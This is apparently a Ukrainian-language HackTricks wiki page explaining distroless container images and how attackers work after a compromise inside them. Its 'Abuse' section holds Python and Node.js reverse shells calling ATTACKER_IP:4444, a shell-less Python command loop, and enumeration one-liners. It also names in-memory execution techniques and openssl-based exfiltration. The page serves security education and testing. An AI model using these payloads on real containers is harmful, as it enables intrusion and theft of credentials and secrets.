# Distroless-контейнери

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

**distroless**-образ контейнера — це образ, який містить **мінімальні компоненти runtime, необхідні для запуску однієї конкретної application**, навмисно вилучаючи звичайні інструменти дистрибутива, такі як package managers, shells і великі набори стандартних userland-утиліт. На практиці distroless-образи часто містять лише application binary або runtime, його shared libraries, bundles сертифікатів і дуже малу структуру файлової системи.

Суть не в тому, що distroless є новим примітивом kernel isolation. Distroless — це **стратегія дизайну образу**. Вона змінює те, що доступно **всередині** файлової системи контейнера, але не те, як kernel ізолює контейнер. Це важливо, оскільки distroless посилює середовище переважно шляхом зменшення кількості можливостей, які attacker може використати після отримання code execution. Він не замінює namespaces, seccomp, capabilities, AppArmor, SELinux або будь-який інший механізм runtime isolation.

## Навіщо існує Distroless

Distroless-образи переважно використовують для зменшення:

- розміру образу
- operational complexity образу
- кількості packages і binaries, які можуть містити vulnerabilities
- кількості post-exploitation tools, доступних attacker за замовчуванням

Саме тому distroless-образи популярні у production application deployments. Контейнер, який не містить shell, package manager і майже жодних стандартних інструментів, зазвичай простіше аналізувати з operational точки зору та складніше зловживати ним інтерактивно після компрометації.

Приклади відомих сімейств образів у стилі distroless:

- Google's distroless images
- Chainguard hardened/minimal images

## Чим Distroless не є

Distroless-контейнер **не є**:

- автоматично rootless
- автоматично non-privileged
- автоматично read-only
- автоматично захищеним seccomp, AppArmor або SELinux
- автоматично захищеним від container escape

Distroless-образ усе ще можна запустити з `--privileged`, спільним використанням host namespaces, небезпечними bind mounts або підключеним runtime socket. У такому сценарії образ може бути мінімальним, але контейнер усе одно може бути катастрофічно небезпечним. Distroless змінює **userland attack surface**, а не **kernel trust boundary**.

## Типові operational characteristics

Коли ви компрометуєте distroless-контейнер, перше, що зазвичай помічаєте, — звичні припущення перестають бути правильними. Може не бути `sh`, `bash`, `ls`, `id`, `cat`, а іноді навіть libc-based environment, який поводиться так, як очікує ваш usual tradecraft. Це впливає як на offense, так і на defense, оскільки відсутність інструментів змінює debugging, incident response і post-exploitation.

Найпоширеніші patterns:

- application runtime існує, але майже нічого іншого немає
- shell-based payloads не працюють, оскільки shell відсутній
- стандартні enumeration one-liners не працюють, оскільки helper binaries відсутні
- file system protections, такі як read-only rootfs або `noexec` на writable tmpfs locations, також часто присутні

Саме ця комбінація зазвичай змушує говорити про "weaponizing distroless".

## Distroless і Post-Exploitation

Основна offensive challenge у distroless environment — не завжди початковий RCE. Часто важливіше те, що відбувається далі. Якщо compromised workload надає code execution у language runtime, такому як Python, Node.js, Java або Go, ви можете виконувати довільну логіку, але не через звичайні shell-centric workflows, поширені на інших Linux targets.

Тому post-exploitation часто рухається в одному з трьох напрямків:

1. **Безпосередньо використовувати наявний language runtime**, щоб enumeratе environment, відкривати sockets, читати files або розгортати додаткові payloads.
2. **Завантажити власні tools у memory**, якщо filesystem є read-only або writable locations змонтовані з `noexec`.
3. **Зловживати наявними binaries, які вже присутні в образі**, якщо application або її dependencies несподівано містять щось корисне.

## Abuse

### Enumerate The Runtime You Already Have

У багатьох distroless-контейнерах немає shell, але все ще є application runtime. Якщо target — Python service, Python присутній. Якщо target — Node.js, Node присутній. Часто цього достатньо, щоб enumeratе files, читати environment variables, відкривати reverse shells і виконувати code in-memory, не викликаючи `/bin/sh`.

Простий приклад із Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Простий приклад із Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Вплив:

- відновлення змінних середовища, які часто містять облікові дані або кінцеві точки сервісів
- перелік файлової системи без `/bin/ls`
- виявлення доступних для запису шляхів і змонтованих секретів

### Reverse Shell без `/bin/sh`

Якщо образ не містить `sh` або `bash`, класичний reverse shell на основі shell може одразу завершитися невдало. У такій ситуації використовуйте встановлене мовне середовище виконання.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Якщо `/bin/sh` не існує, замініть останній рядок на пряме виконання команд через Python або цикл REPL Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Знову ж таки, якщо `/bin/sh` відсутній, використовуйте безпосередньо файлові, процесні та мережеві API Node замість запуску shell.

### Повний приклад: Python Command Loop без shell

Якщо в image є Python, але взагалі немає shell, простого інтерактивного циклу часто достатньо для збереження повної можливості post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Це не потребує бінарного файлу інтерактивної оболонки. З погляду атакувальника вплив фактично такий самий, як і від базової оболонки: виконання команд, розвідка та підготовка подальших payloads через наявний runtime.

### Виконання інструментів у пам'яті

Distroless images часто комбінуються з:

- `readOnlyRootFilesystem: true`
- доступним для запису, але `noexec` tmpfs, таким як `/dev/shm`
- відсутністю інструментів керування пакетами

Така комбінація робить класичні сценарії «завантажити бінарний файл на диск і запустити його» ненадійними. У таких випадках основною відповіддю стають техніки виконання в пам'яті.

Окрема сторінка присвячена цьому:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Найбільш релевантні техніки там:

- `memfd_create` + `execve` через scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Наявні бінарні файли в image

Деякі Distroless images все ще містять операційно необхідні бінарні файли, які стають корисними після compromise. Один із часто спостережуваних прикладів — `openssl`, оскільки застосункам іноді потрібен він для завдань, пов'язаних із crypto або TLS.

Швидкий шаблон пошуку:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Якщо присутній `openssl`, його можна використовувати для:

- вихідних TLS-з'єднань
- data exfiltration через дозволений канал egress
- підготовки даних payload через кодовані/зашифровані blobs

Точний спосіб зловживання залежить від того, що саме встановлено, але загальна ідея полягає в тому, що distroless не означає «взагалі без інструментів»; це означає «значно менше інструментів, ніж у звичайному distribution image».

## Перевірки

Мета цих перевірок — визначити, чи є image справді distroless на практиці, і які runtime або helper binaries все ще доступні для post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Що тут цікавого:

- Якщо shell відсутній, але присутній runtime, наприклад Python або Node, post-exploitation має перейти до виконання через runtime.
- Якщо коренева файлова система доступна лише для читання, а `/dev/shm` доступний для запису, але має параметр `noexec`, техніки виконання в памʼяті стають набагато актуальнішими.
- Якщо присутні допоміжні бінарні файли, такі як `openssl`, `busybox` або `java`, вони можуть надати достатньо функціональності для подальшого розширення доступу.

## Типові налаштування runtime

| Стиль образу / платформи | Типовий стан | Типова поведінка | Поширене ручне послаблення |
| --- | --- | --- | --- |
| Образи в стилі Google distroless | Мінімальний userland за задумом | Відсутні shell і package manager, наявні лише залежності застосунку/runtime | додавання debugging-шарів, sidecar-shell, копіювання busybox або інструментів |
| Мінімальні образи Chainguard | Мінімальний userland за задумом | Зменшена поверхня пакетів, часто орієнтація на один runtime або сервіс | використання `:latest-dev` або debug-варіантів, копіювання інструментів під час build |
| Kubernetes workloads, що використовують distroless-образи | Залежить від конфігурації Pod | Distroless впливає лише на userland; стан безпеки Pod також залежить від специфікації Pod і типових параметрів runtime | додавання ephemeral debug containers, монтування host, привілейовані налаштування Pod |
| Docker / Podman, що запускають distroless-образи | Залежить від run-флагів | Мінімальна файлова система, але безпека runtime також залежить від прапорців і конфігурації daemon | `--privileged`, спільне використання host namespace, монтування runtime socket, доступні для запису host binds |

Ключовий момент полягає в тому, що distroless є **властивістю образу**, а не захистом runtime. Його цінність полягає у зменшенні кількості доступних компонентів у файловій системі після компрометації.

## Повʼязані сторінки

Щодо bypass для файлової системи та виконання в памʼяті, які зазвичай потрібні в distroless-середовищах:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Щодо зловживання container runtime, socket і mount, яке все ще застосовне до distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
